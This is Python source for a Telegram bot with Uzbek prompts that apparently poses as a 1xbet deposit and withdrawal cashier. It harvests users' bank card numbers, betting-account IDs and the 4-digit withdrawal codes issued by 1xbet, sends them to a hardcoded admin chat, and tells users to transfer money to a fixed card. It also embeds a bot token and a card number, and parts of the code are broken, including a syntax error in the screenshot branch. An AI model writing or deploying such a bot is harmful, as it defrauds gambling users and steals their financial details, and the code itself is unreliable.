from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from datetime import datetime

TOKEN = "7250586844:AAGv-qh10O_SUZjE4eGodSwdPc63_Be0QhE"
ADMIN_CHAT_ID = "5258395757"

user_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💰 Hisob to‘ldirish", callback_data="deposit")],
        [InlineKeyboardButton("📤 Pul chiqarish", callback_data="withdraw")],
        [InlineKeyboardButton("👨‍💻 Aloqa", callback_data="contact")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Assalomu alaykum, hush kelibsiz! Kerakli menyuni tanlang 👇",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "deposit":
        await query.message.reply_text("1xbet ID raqamingizni kiriting:")
        context.user_data["state"] = "awaiting_id"
    elif query.data == "withdraw":
        await query.message.reply_text(
            "⚠️Oldin shu manzilga ariza yarating va 4 talik kodni oling. (shaxar; Oltiariq) (Kocha; remax24/7)✅\n\n🆔ID raqamingizni kiriting..."
        )
        context.user_data["state"] = "awaiting_withdraw_id"
    elif query.data == "contact":
        await query.message.reply_text(
            "Operatorlarimiz sizga 24/7 xizmat ko‘rsatadi!\n\n👉 [Telegram](https://t.me/xbetkassauz1)", 
            disable_web_page_preview=True
        )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    state = context.user_data.get("state")
    user_id = update.message.from_user.id

    if state == "awaiting_id":
        context.user_data["1xbet_id"] = text
        await update.message.reply_text("Karta raqamingizni kiriting:")
        context.user_data["state"] = "awaiting_card"
    elif state == "awaiting_card":
        context.user_data["card"] = text
        await update.message.reply_text("Minimal: 15000 UZS\nMaksimal: 3000000 UZS\n\nTo‘lov summasini kiriting:")
        context.user_data["state"] = "awaiting_amount"
    elif state == "awaiting_amount":
        amount = text
        user_data[user_id] = {
            "1xbet_id": context.user_data["1xbet_id"],
            "card": context.user_data["card"],
            "amount": amount
        }
        await update.message.reply_text(
            f"Diqqat! Bot sizga bergan aniq {amount} UZS o'tkazing! "
            "Aks holda pul hisobingizga tushmaydi!\n\n"
            f"Karta: 8600530490663815\nBUNI O'TKAZING: {amount} UZS\n\n"
            "✅ To'lovni amalga oshirganingizdan so'ng, 5 daqiqa ichida 'Tasdiqlash' tugmasini bosishingiz shart!"
        )
        keyboard = [[InlineKeyboardButton("✅ Tasdiqlash", callback_data="confirm_payment")]]
        await update.message.reply_text(
            "TUGMANI BOSIB BIZGA PUL YUBORGANINGIZ HAQIDAGI SKRINSHOTNI YUKLANG\n\n"
            "⛔️ Agar xato qilib, boshqa summani o‘tkazsangiz, pulni 15 ish kuni ichida qaytaramiz yoki pulingiz kuyadi!\n\n"
            "Agar to'lov darhol amalga oshmasa, biroz kuting admin tekshiradi va yuboradi. Rahmat!\n"
            f"TG_ID: {user_id}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        context.user_data["state"] = "awaiting_screenshot"

    elif state == "awaiting_screenshot" and update.message.photo:
        # Foydalanuvchi screenshot yubordi
        await update.message.reply_text("Rahmat! Iltimos, biroz kuting — pul tezda yuboriladi.")
        # Admin ga bildirish
        data = user_data.get(chat_id="5258395757", {})
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        await context.bot.send_message(
            ADMIN_CHAT_ID,
            f"💳 Karta raqami: 8600530490663815\n🆔 {data.get('1xbet_id')}\n💶 Summa: {data.get('amount')} soʻm\n🕘 {now}\n✅ Muvaffaqiyatli o‘tkazildi"
        )
        context.user_data.clear()

    elif state == "awaiting_withdraw_id":
        context.user_data["withdraw_id"] = text
        await update.message.reply_text("Ajoyib! Pul qabul qilish uchun karta raqamingizni kiriting:")
        context.user_data["state"] = "awaiting_withdraw_card"
    elif state == "awaiting_withdraw_card":
        context.user_data["withdraw_card"] = text
        await update.message.reply_text("1xbet tomonidan berilgan 4 talik kodni kiriting:")
        context.user_data["state"] = "awaiting_withdraw_code"
    elif state == "awaiting_withdraw_code":
        code = text
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        await update.message.reply_text(
            f"✅ Arizangiz muvoffaqiyatli qabul qilindi!\n\n"
            f"#90455\n💳 Karta: {context.user_data['withdraw_card']}\n"
            f"🆔1xbet ID: {context.user_data['withdraw_id']}\n"
            f"#️⃣4 talik kod: {code}\n📆 Vaqt: {now}\n\n"
            "Pul kartangizga tez orada o'tkaziladi. "
            "Iltimos sabrli bo'ling — pul 10 daqiqadan 10 soatgacha yuboriladi. "
            "Sabr-toqatingiz uchun rahmat!\n/start"
        )
        # Admin ga xabar yuborish
        await context.bot.send_message(
            ADMIN_CHAT_ID,
            f"💳 Karta: {context.user_data['withdraw_card']}\n"
            f"🆔1xbet ID: {context.user_data['withdraw_id']}\n"
            f"#️⃣ 4 talik kod: {code}\n📆 Vaqt: {now}"
        )
        context.user_data.clear()
    else:
        await update.message.reply_text("Iltimos, menyudan kerakli buyruqni tanlang yoki /start ni bosib qayta boshlang.")

async def confirm_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Skrinshotni shu yerga yuboring:")
    context.user_data["state"] = "awaiting_screenshot"

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, message_handler))
    app.add_handler(CallbackQueryHandler(confirm_payment, pattern="confirm_payment"))
    app.run_polling()

if __name__ == "__main__":
    main()
